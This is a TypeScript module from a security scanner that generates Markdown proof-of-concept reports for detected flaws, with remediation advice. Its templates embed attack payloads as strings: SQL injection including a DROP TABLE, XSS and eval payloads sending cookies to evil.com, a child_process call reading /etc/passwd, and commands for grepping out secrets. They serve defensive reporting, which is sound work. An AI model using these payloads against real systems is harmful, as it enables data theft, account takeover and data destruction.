/**
 * PoC Generator - Exploit Demonstration for Detected Vulnerabilities
 *
 * Generates Proof-of-Concept exploit reports in Markdown format.
 * NEVER executes exploits — output is documentation only.
 *
 * Each PoC includes:
 * - Vulnerability description
 * - Exploit payload
 * - Step-by-step reproduction
 * - Remediation guide
 *
 * @module governance/poc-generator
 * @version 1.0.0
 * @since 2026-01-31
 */

import type { ASTFinding } from './ast-analyzer';

// ============================================================================
// TYPES
// ============================================================================

export interface PoCReport {
  readonly finding: ASTFinding;
  readonly title: string;
  readonly description: string;
  readonly exploitPayload: string;
  readonly reproductionSteps: readonly string[];
  readonly impact: string;
  readonly remediation: string;
  readonly references: readonly string[];
  readonly markdown: string;
}

// ============================================================================
// PATTERN-SPECIFIC PoC GENERATORS
// ============================================================================

type PoCTemplate = (finding: ASTFinding) => Omit<PoCReport, 'finding' | 'markdown'>;

const sqlInjectionPoC: PoCTemplate = finding => ({
  title: `SQL Injection in ${finding.file}:${finding.line}`,
  description: `Unsanitized user input is concatenated into a SQL query, allowing an attacker to execute arbitrary SQL commands against the database.`,
  exploitPayload: `' OR '1'='1' --\n' UNION SELECT username, password FROM users --\n'; DROP TABLE users; --`,
  reproductionSteps: [
    `Navigate to the endpoint that triggers the code at ${finding.file}:${finding.line}`,
    `Provide the following input in the vulnerable parameter: \`' OR '1'='1' --\``,
    `Observe that the query returns all rows instead of the expected filtered result`,
    `For data exfiltration, use: \`' UNION SELECT username, password FROM users --\``,
  ],
  impact: `Full database compromise. Attacker can read, modify, or delete any data. In worst case, can escalate to OS-level command execution via xp_cmdshell (MSSQL) or COPY TO/FROM (PostgreSQL).`,
  remediation: `Replace string concatenation/template literals with parameterized queries:\n\n\`\`\`typescript\n// BEFORE (vulnerable)\ndb.query(\`SELECT * FROM users WHERE id = \${userId}\`);\n\n// AFTER (safe)\ndb.query('SELECT * FROM users WHERE id = $1', [userId]);\n\`\`\`\n\nUse an ORM (Prisma, TypeORM) which parameterizes by default.`,
  references: [
    'https://owasp.org/www-community/attacks/SQL_Injection',
    'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
  ],
});

const xssPoC: PoCTemplate = finding => ({
  title: `Cross-Site Scripting (XSS) in ${finding.file}:${finding.line}`,
  description: `Unescaped user content is rendered via dangerouslySetInnerHTML, allowing injection of arbitrary JavaScript in the user's browser.`,
  exploitPayload: `<img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">\n<script>fetch('https://evil.com/steal',{method:'POST',body:document.cookie})</script>`,
  reproductionSteps: [
    `Find an input field that feeds into the component at ${finding.file}:${finding.line}`,
    `Enter the payload: \`<img src=x onerror="alert(document.cookie)">\``,
    `Observe the JavaScript executes in the browser context`,
    `An attacker can steal session cookies, redirect users, or deface the page`,
  ],
  impact: `Session hijacking via cookie theft, account takeover, defacement, and phishing attacks against other users.`,
  remediation: `Sanitize all user input before rendering:\n\n\`\`\`typescript\nimport DOMPurify from 'dompurify';\n\n// BEFORE (vulnerable)\n<div dangerouslySetInnerHTML={{ __html: userContent }} />\n\n// AFTER (safe)\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />\n\n// BEST: Avoid dangerouslySetInnerHTML entirely\n<div>{userContent}</div>\n\`\`\``,
  references: [
    'https://owasp.org/www-community/attacks/xss/',
    'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
  ],
});

const authBypassPoC: PoCTemplate = finding => ({
  title: `Authentication Bypass in ${finding.file}:${finding.line}`,
  description: `A sensitive route handler lacks authentication middleware, allowing unauthenticated access to protected resources.`,
  exploitPayload: `curl -X GET http://localhost:3000/admin/users\ncurl -X POST http://localhost:3000/api/admin/delete-user -d '{"id": 1}'`,
  reproductionSteps: [
    `Open a browser in incognito mode (no session cookies)`,
    `Navigate directly to the route defined at ${finding.file}:${finding.line}`,
    `Observe that the page loads without requiring login`,
    `Alternatively, use curl without any auth headers to access the endpoint`,
  ],
  impact: `Unauthorized access to admin functionality, user data exposure, privilege escalation. Attacker can access any protected resource without authentication.`,
  remediation: `Add authentication middleware before the route handler:\n\n\`\`\`typescript\n// BEFORE (vulnerable)\napp.get('/admin', (req, res) => { ... });\n\n// AFTER (safe)\napp.get('/admin', requireAuth, requireRole('admin'), (req, res) => { ... });\n\`\`\`\n\nFor Next.js, use middleware.ts or check session in the route handler.`,
  references: [
    'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/',
    'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html',
  ],
});

const hardcodedCredsPoC: PoCTemplate = finding => ({
  title: `Hardcoded Credentials in ${finding.file}:${finding.line}`,
  description: `Sensitive credentials are hardcoded in source code instead of being loaded from environment variables or a secrets manager.`,
  exploitPayload: `# Extract from source code:\ngrep -rn "password\\|secret\\|api_key" src/\n# Or from compiled bundle:\nstrings dist/bundle.js | grep -i "password\\|secret\\|key"`,
  reproductionSteps: [
    `Open ${finding.file} at line ${finding.line}`,
    `Observe the hardcoded credential in the source code`,
    `If this is in a client-side bundle, any user can view it via browser DevTools`,
    `Use the extracted credential to authenticate as the application`,
  ],
  impact: `Full compromise of the service the credential protects. If the credential is for a database, attacker gains direct database access. If it's an API key, attacker can impersonate the application.`,
  remediation: `Move credentials to environment variables:\n\n\`\`\`typescript\n// BEFORE (vulnerable)\nconst apiKey = "sk-1234567890abcdef";\n\n// AFTER (safe)\nconst apiKey = process.env.API_KEY;\nif (!apiKey) throw new Error('API_KEY environment variable required');\n\`\`\`\n\nFor production, use a secrets manager (AWS Secrets Manager, HashiCorp Vault).`,
  references: [
    'https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password',
    'https://cwe.mitre.org/data/definitions/798.html',
  ],
});

const codeInjectionPoC: PoCTemplate = finding => ({
  title: `Code Injection via eval() in ${finding.file}:${finding.line}`,
  description: `Dynamic code execution via eval() or Function() constructor allows an attacker to execute arbitrary JavaScript on the server or client.`,
  exploitPayload: `// Server-side RCE:\nrequire('child_process').execSync('cat /etc/passwd')\n\n// Client-side:\nfetch('https://evil.com/steal?data='+btoa(document.cookie))`,
  reproductionSteps: [
    `Identify the input that flows into eval() at ${finding.file}:${finding.line}`,
    `Inject JavaScript code as the input value`,
    `On server: execute system commands via child_process`,
    `On client: steal cookies or redirect users`,
  ],
  impact: `Remote Code Execution (RCE). Attacker can execute arbitrary commands on the server, read files, install backdoors, or pivot to other systems.`,
  remediation: `Remove eval() entirely. Use safe alternatives:\n\n\`\`\`typescript\n// BEFORE (vulnerable)\nconst result = eval(userExpression);\n\n// AFTER (safe) — use JSON.parse for data\nconst result = JSON.parse(userInput);\n\n// AFTER (safe) — use a sandboxed evaluator for expressions\nimport { evaluate } from 'mathjs';\nconst result = evaluate(userExpression);\n\`\`\``,
  references: [
    'https://owasp.org/www-community/attacks/Code_Injection',
    'https://cwe.mitre.org/data/definitions/94.html',
  ],
});

// ============================================================================
// PoC GENERATOR
// ============================================================================

const TEMPLATES: Record<string, PoCTemplate> = {
  sql_injection: sqlInjectionPoC,
  xss_vulnerability: xssPoC,
  auth_bypass: authBypassPoC,
  hardcoded_credentials: hardcodedCredsPoC,
  code_injection: codeInjectionPoC,
};

export class PoCGenerator {
  /**
   * Generate a PoC report for a finding.
   * Returns null if no template exists for the pattern.
   */
  generate(finding: ASTFinding): PoCReport | null {
    const template = TEMPLATES[finding.pattern];
    if (!template) return null;

    const data = template(finding);
    const markdown = this.renderMarkdown(finding, data);

    return { finding, ...data, markdown };
  }

  /**
   * Generate PoC reports for multiple findings.
   */
  generateAll(findings: ASTFinding[]): PoCReport[] {
    const reports: PoCReport[] = [];
    for (const finding of findings) {
      const report = this.generate(finding);
      if (report) reports.push(report);
    }
    return reports;
  }

  /**
   * Get list of supported patterns.
   */
  getSupportedPatterns(): string[] {
    return Object.keys(TEMPLATES);
  }

  // ============================================================================
  // PRIVATE
  // ============================================================================

  private renderMarkdown(
    finding: ASTFinding,
    data: Omit<PoCReport, 'finding' | 'markdown'>
  ): string {
    const severityEmoji: Record<string, string> = {
      critical: 'CRITICAL',
      high: 'HIGH',
      medium: 'MEDIUM',
      low: 'LOW',
    };

    return `# ${data.title}

**Severity:** ${severityEmoji[finding.severity] ?? finding.severity}
**Pattern:** \`${finding.pattern}\`
**Confidence:** ${(finding.confidence * 100).toFixed(0)}%
**Location:** \`${finding.file}:${finding.line}:${finding.column}\`

## Description

${data.description}

## Vulnerable Code

\`\`\`typescript
${finding.codeSnippet}
\`\`\`

## Exploit Payload

\`\`\`
${data.exploitPayload}
\`\`\`

## Reproduction Steps

${data.reproductionSteps.map((step, i) => `${i + 1}. ${step}`).join('\n')}

## Impact

${data.impact}

## Remediation

${data.remediation}

## References

${data.references.map(r => `- ${r}`).join('\n')}

---
*Generated by OLYMPUS Sentinel PoC Generator — This report is for authorized security testing only.*
`;
  }
}
